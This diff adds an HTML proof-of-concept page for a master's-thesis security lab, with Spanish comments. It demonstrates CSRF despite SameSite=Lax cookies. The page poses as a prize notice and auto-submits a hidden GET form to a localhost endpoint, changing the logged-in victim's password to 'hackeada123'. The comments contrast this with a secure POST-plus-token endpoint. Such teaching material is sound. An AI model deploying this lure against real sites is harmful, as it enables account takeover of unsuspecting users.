@@ -1,0 +1,28 @@
+<!doctype html>
+<!--
+  PoC de CSRF para el laboratorio del TFM (arquitectura front/back).
+
+  Como la cookie de sesion es SameSite=Lax, un <img> cross-site NO envia la
+  cookie (es subrecurso). Pero una NAVEGACION de nivel superior por GET SI la
+  envia. Por eso la PoC es un formulario GET que se auto-envia: es exactamente
+  el motivo por el que un cambio de estado por GET sigue siendo peligroso aun
+  con SameSite=Lax (buen punto para 5.3.5).
+
+  USO:
+   1. Inicia sesion en la app como victima (p. ej. marina) en el mismo navegador.
+   2. Sustituye LAB_HOST abajo por tu host (p. ej. localhost:8080 en Docker,
+      o 127.0.0.1:4321 en desarrollo).
+   3. Abre este fichero. La contraseña de la victima cambiará a 'hackeada123'
+      sin su consentimiento (endpoint vulnerable). El endpoint seguro (POST +
+      token) rechazaría la petición.
+-->
+<html lang="es">
+<head><meta charset="utf-8"><title>Has ganado un premio</title></head>
+<body>
+  <h1>Cargando tu regalo...</h1>
+  <form id="f" action="http://localhost:8080/api/profile/password" method="GET">
+    <input type="hidden" name="new" value="hackeada123">
+  </form>
+  <script>document.getElementById('f').submit();</script>
+</body>
+</html>
